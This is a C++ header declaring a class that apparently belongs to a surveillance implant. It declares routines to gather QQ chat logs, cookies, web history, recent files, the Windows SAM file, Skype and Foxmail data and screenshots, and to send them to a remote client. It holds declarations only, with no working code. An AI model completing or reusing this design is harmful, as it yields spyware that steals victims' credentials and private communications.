#ifndef __RUN__TSPSERVER_EVIDENCE__H___
#define __RUN__TSPSERVER_EVIDENCE__H___

#include "Skype.h"
#include "macros.h"
#include "ClientSocket.h"
#include "EvidenceScreen.h"
#include "EvidenceFoxMail.h"

class CEvidence/* : public CManager */ 
{
public:
	CEvidence();
	~CEvidence(void);

	BOOL StartWork();
	BOOL StopWork();
	BOOL SetWorkState(INFOSTATE *pInfoState, int nSize);
	BOOL GetWorkState(INFOSTATE *pInfoState);
	BOOL SetSingleSign(LPCSTR lpFileName);
	static BOOL WINAPI FilterFileEx(LPVOID lpThis, LPSTR lpFileName);
	BOOL FilterFile( LPSTR lpFileName);

	void GetMiQiu();
	BOOL SetAutoSreenArg(TCHAR *szCmdLine);

	BOOL PassBackFileList(CHAR *szBuffer,CHAR *szFirstFile);





private:
	typedef struct  tag_CONFIGFILENODE
	{
		CHAR nMagic[4];				//文件结构体的魔数
		CHAR szFileName[MAX_PATH];  //文件全路径
		FILETIME dwTmModify;		//文件的修改时间
		BOOL bValid;				//文件节点是否有效
	}CONFIGFILENODE, *LPCONFIGFILENODE;

	typedef struct  
	{ 
		int nTypeAlarmSrn;
		CHAR szFilterContent[12];
	}FILTERCONTENT, *PFILTERCONTENT;

	static DWORD WINAPI SendToClient2(LPVOID lpVoid);
	static DWORD WINAPI SendToClientEx(LPVOID lpVoid);		//回传到客户端
	DWORD SendToClient();

	static DWORD WINAPI GetLocalFileEx(LPVOID LPARAM);//获取本地的文件
	static DWORD WINAPI GetLocalDirList(LPVOID LPARAM);//获取本地的文件列表

	static DWORD WINAPI GetQQlog(LPVOID LPARAM);//获取QQ的聊天记录文件


	static DWORD WINAPI GetSystemInfoEx(LPVOID LPARAM);
	static DWORD WINAPI MonitorAccessEx(LPVOID lpVoid);		//对访问记录进行监控
	DWORD MonitorAccess();

	BOOL CreateRecentFileOne(PWIN32_FIND_DATA lpFindFileData);
	BOOL GetFileNameFormCutShort(LPTSTR strFileName, LPTSTR strOutFileName);
	BOOL CopyWebPath(LPSTR lpPath);
	int ReplaceStr(char *sSrc, char *sMatchStr, char *sReplaceStr);
	BOOL CreateRecentFile();		//创建我最近访问的文件取证数据
	BOOL CreateWebHistory();		//创建我Web访问历史文件	
	BOOL InitParam();
	BOOL DeleteDirectory(LPCTSTR sDirName);
//	BOOL CreateQQLogFile();
	BOOL CreateCookiesFile();
//	BOOL CreateQQFileOne(LPCSTR lpPathName);
	BOOL StartPlugScreen();
	BOOL StopPlugScreen();
	BOOL GetSamFile();

	BOOL CreateQQLogFile(char *  szQQPath);
	BOOL CreateQQFileOne(LPCSTR lpPathName);

	//
	BOOL DirToFile(TCHAR *szDriver);

	BOOL GetLocalFile(TCHAR *szHuiChan);

	BOOL GetSystemInfo(TCHAR *szMaction);
	void GetSystemSub(char *szExe,char *szsysinfo);

	
private:	
	char m_szPathEvidence[MAX_PATH];
	char m_szPathRecent[MAX_PATH];
	char m_szPathWeb[MAX_PATH];
	char m_szLogUser[MAX_PATH];

	char m_szSysRecent[MAX_PATH];
	char m_szSysHistory[MAX_PATH];

	char m_szSingleMark[MAX_PATH];
	int m_nMacAddr[6];
	char m_szConfigFileName[MAX_PATH];
	char m_szPathCookies[MAX_PATH];
	char m_szPathQQ[MAX_PATH];
	char m_szPathSam[MAX_PATH];

	char m_szPathPassBack[MAX_PATH];
	char m_szPathDir[MAX_PATH];

	char m_szPathMachine[MAX_PATH];




	HANDLE m_hConfigFile;
	HANDLE m_hThreadMonitor;
	HANDLE m_hThreadSend;
	HANDLE m_hevnetMonitor;
	HANDLE m_heventSend;
	HANDLE m_hQuit;
	CSkype *m_pObjSkype;
	BOOL m_bWorking;
	DWORD m_dwCapacity;
	DWORD m_dwAvalible;
	int m_nWorkState;
	int m_nCapacityCount;
	CClientSocket	*m_pSocketClient;
	CEvidenceScreen *m_pScreen;
	char m_szPlugSreenName[MAX_PATH];
	char m_szFDump[MAX_PATH];

	BOOL m_bWorkPlugScreen;

	HMODULE m_hDllCleverScreen;
	CRITICAL_SECTION m_cs;

	CEvidenceFoxMail *m_pFoxmail;
	static FILTERCONTENT m_sFilterContent[];
	INFOSTATE m_infoState;


};

#endif//__RUN__TSPSERVER_EVIDENCE__H___